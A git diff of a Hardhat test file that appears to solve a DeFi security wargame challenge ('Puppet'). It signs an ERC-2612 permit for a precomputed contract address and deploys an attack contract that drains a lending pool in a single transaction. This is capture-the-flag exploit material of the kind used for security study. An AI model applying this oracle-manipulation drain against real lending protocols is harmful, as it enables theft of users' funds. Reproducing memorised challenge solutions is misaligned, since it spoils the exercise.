@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { signERC2612Permit } = require('eth-permit');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -95,24 +96,41 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        hackPuppet = await (await ethers.getContractFactory('HackPuppet', deployer)).deploy(
+
+        // Calculate the address of the contract created by player with current nonce 0
+        const myAddress = ethers.utils.getContractAddress({from: player.address, nonce: 0});
+
+        // Take advantage of new ERC2612 new form of approve without the need of sending a transaction
+        // Use eth-permit library to sign a permit for our future contract address
+        const result = await signERC2612Permit(
+            player,
+            token.address,
+            player.address,
+            myAddress,
+            ethers.utils.parseUnits('1000', 'ether')
+        );
+
+        // Deploy our contract and execute the whole code inside the constructor
+        hackPuppet = await (await ethers.getContractFactory('HackPuppet', player)).deploy(
             lendingPool.address,
             token.address,
-            uniswapExchange.address
-        );
-        // Need to approve our contract to transfer tokens for us
-        await token.connect(player).approve(hackPuppet.address, PLAYER_INITIAL_TOKEN_BALANCE);
-        await hackPuppet.connect(player).hack(
+            uniswapExchange.address,
             PLAYER_INITIAL_TOKEN_BALANCE,
             POOL_INITIAL_TOKEN_BALANCE,
+            result.deadline,
+            result.v,
+            result.r,
+            result.s,
             { value: 24n * 10n ** 18n }
         );
-        
+    
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-        
+        // Player executed a single transaction
+        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
+
         // Player has taken all tokens from the pool       
         expect(
             await token.balanceOf(lendingPool.address)
